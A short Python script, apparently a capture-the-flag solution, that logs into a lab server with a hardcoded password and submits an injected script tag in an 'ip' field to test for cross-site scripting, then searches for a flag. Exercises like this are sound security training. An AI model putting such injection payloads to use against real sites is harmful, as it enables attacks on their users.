import urllib
import urllib2
import requests
url = 'https://172.27.20.32:8443/login.php'
values = {'username': 'sumedh',
          'password': 'CXbXPGbNfXNvBEL'}

session = requests.session()
r = session.post(url, data=values, verify=False)
#print r.content

url = 'https://172.27.20.32:8443/chal6.php'
values = {'ip' : 'google.com<script>alert("xxxx");</script>'}
r = session.post(url, data=values, verify = False)
print r.content
print r.content.find("flag{")



